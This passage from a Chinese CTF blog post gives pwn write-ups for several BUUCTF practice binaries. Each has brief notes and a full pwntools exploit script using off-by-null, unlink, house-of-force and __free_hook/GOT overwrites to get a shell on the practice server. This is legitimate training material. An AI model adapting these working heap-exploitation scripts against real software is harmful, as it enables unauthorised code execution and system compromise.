class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>),p64(target))</span><br><span class="line">    og = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    og = [i+libc_base <span class="keyword">for</span> i <span class="keyword">in</span> og]</span><br><span class="line">    add(<span class="number">0x60</span>,p64(<span class="number">0</span>),<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(og[<span class="number">3</span>]))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>



<h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a>sctf_2019_easy_heap</h2><p>稍微复杂的题  给了个off-by-null 但是没有show 并且不给覆盖got表，给出了一个可以写shellcode的位置 和 text地址。</p>
<p>由于不给覆盖got表，只能考虑覆盖libc中地址，但是libc地址不知道，这里可以利用unsortedbin的指针和_malloc_hook接近的特性，先构造重叠，然后让unsortedbin和tcache重叠，申请的时候部分覆盖。</p>
<p>这里我发现了一个事情，就是largebin切割下来的unsortedbin 不会成为last_remainder 这很神奇，因为前面house_of_orange貌似它又是last_remainder，不知道这里为什么又不是，同样都是从unsortedbin 进入 largebin 又从largebin切割。但是ai说一般不会设置last_remainder 。</p>
<p>所以申请回来进行部分覆盖的时候，最好是申请等同大小，保证它不会进入largebin，就可以稳定覆盖第一个字节 ，而不是两个字节(导致不确定)。</p>
<p>另外就是要打unlink ，unlink分配到目标位置后写 shellcode</p>
<p>其实第二次可能也可以用tcache 来打？ 但是既然它给了指针 很显然要我们打unlink。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26986</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./sctf_2019_easy_heap&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,itob(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,itob(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,itob(index))</span><br><span class="line">    sa(<span class="string">b&#x27;Content:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;Mmap: &#x27;</span>)</span><br><span class="line">    mmap = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(mmap))</span><br><span class="line">    add(<span class="number">0x410</span>) <span class="comment">#0</span></span><br><span class="line">    ru(<span class="string">b&#x27;Address &#x27;</span>)</span><br><span class="line">    ptr = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ptr))</span><br><span class="line">    add(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x38</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x420</span>+<span class="number">0x20</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x410</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x510</span>) <span class="comment">#1</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;\x30\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x4f0</span>) <span class="comment">#5</span></span><br><span class="line">    ptr += <span class="number">0x30</span></span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>))</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0x400</span>)+p64(mmap)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">2</span>,shellcode+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p64(mmap)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>strcpy导致的堆溢出，直接覆盖topchunksize打house_of_force 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27061</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6-i386_2.23-0ubuntu11_amd64/lib32/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./bcloud_bctf_2016&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>,itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the length&#x27;</span>,itob(size-<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Input the content:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,data</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the id:&#x27;</span>,itob(index))</span><br><span class="line">    sla(<span class="string">b&#x27;Input the new content:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Input the id:\n&#x27;</span>,itob(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.send(<span class="string">b&#x27;\xff&#x27;</span>*(<span class="number">64</span>*<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Hey &#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">    heap_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    top_chunk = <span class="number">0x80ed0d8</span> - <span class="number">0x80ed008</span> + heap_leak</span><br><span class="line">    target_ptr = <span class="number">0x0804B120</span></span><br><span class="line">    malloc_size = (target_ptr - (top_chunk+<span class="number">0x8</span>) - <span class="number">0x8</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_size&amp;<span class="number">0xfffffff</span>))</span><br><span class="line">    add(malloc_size,<span class="string">b&#x27;&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    free_got = elf.sym[<span class="string">&quot;got.free&quot;</span>]</span><br><span class="line">    puts_plt = <span class="number">0x08048520</span></span><br><span class="line">    atoi_got = elf.sym[<span class="string">&quot;got.atoi&quot;</span>]</span><br><span class="line">    add(<span class="number">12</span>,p32(free_got)+p32(target_ptr)) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">12</span>,p32(atoi_got)) <span class="comment">#2  aoit_got in 4</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">12</span>,p32(free_got)+p32(target_ptr))</span><br><span class="line">    edit(<span class="number">0</span>,p32(puts_plt))</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = libc_leak - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    edit(<span class="number">0</span>,p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    add(<span class="number">22</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">  <span class="comment">#  p = process(&#x27;./bcloud_bctf_2016&#x27;)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()             </span><br></pre></td></tr></table></figure>



<h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h2><p>很创新的off_by_null</p>
<p>我不小心写了个非预期解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;node5.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">29034</span></span><br><span class="line">libc_name = <span class="string">&#x27;../../glibc-all-in-one/libs/libc6_2.23-0ubuntu11_amd64/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     p.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      p.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   p.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">itob = <span class="keyword">lambda</span> a:    <span class="built_in">str</span>(a).encode(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"><span class="comment"># 申请208 大小 可以让description 开始正好在0x00!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;6. Exit&#x27;</span>, itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size, name, desc_size, desc</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter book name size:&#x27;</span>, itob(name_size))</span><br><span class="line">    sa(<span class="string">b&#x27;Enter book name&#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter book description size:&#x27;</span>, itob(desc_size))</span><br><span class="line">    sa(<span class="string">b&#x27;Enter book description:&#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>, itob(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, desc</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>, itob(index))</span><br><span class="line">    sa(<span class="string">b&#x27;Enter new book description:&#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_name</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap_leak:&#x27;</span>+<span class="built_in">hex</span>(heap_leak))</span><br><span class="line"><span class="comment"># 96 第二次name 长度 可以把 指针移到0x00!</span></span><br><span class="line">    current_ptr = heap_leak + <span class="number">0x20</span> + <span class="number">0x20</span> + <span class="number">0x30</span> + <span class="number">0x70</span> + <span class="number">0x10</span> +<span class="number">0x10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;current_ptr:&#x27;</span>+<span class="built_in">hex</span>(current_ptr))</span><br><span class="line">    unsortedbin = heap_leak + <span class="number">0x20</span> + <span class="number">0x20</span> + <span class="number">0x30</span> + <span class="number">0x70</span> + <span class="number">0x40</span> + <span class="number">0x30</span>+ <span class="number">0x10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;unsortedbin:&#x27;</span>+<span class="built_in">hex</span>(unsortedbin))</span><br><span class="line">    add(<span class="number">96</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="number">48</span>,p64(<span class="number">3</span>)+p64(unsortedbin)+p64(current_ptr)+p32(<span class="number">48</span>)+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">96</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="number">48</span>,p32(<span class="number">3</span>)+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">    reset_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    libc_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_leak:&#x27;</span>+<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line">    libc.address = libc_base </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">    edit(<span class="number">3</span>,p64(free_hook)+p32(<span class="number">48</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    edit(<span class="number">3</span>,p64(system)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>,<span class="number">0</span>,<span class="string">b&#x27;&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment">#p = process(filename)</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>



<p>我的方法搞得太麻烦了 ，一方面是author_name可以直接泄露堆地址，这样可以直接打我想出来的后面的部分。</p>
<p>另外就是可以用mmap的超大堆直接泄露libc_base</p>
<p>但是容易出现远程打不通。</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">v我50.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/QRpay/WechatPay.jpg"><img loading="lazy" src="/QRpay/WechatPay.jpg" alt="微信" title="微信"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>py</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://juryorca.github.io/2025/09/04/buuctf/" title="buuctf">http://juryorca.github.io/2025/09/04/buuctf/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/09/16/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E5%AE%9E%E9%AA%8C%E8%A7%86%E9%A2%91/" rel="prev" title="数字逻辑实验视频"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">数字逻辑实验视频</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/08/16/sekai-ctf/" rel="next" title="sekai_ctf"><span class="post-nav-text">sekai_ctf</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> py</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>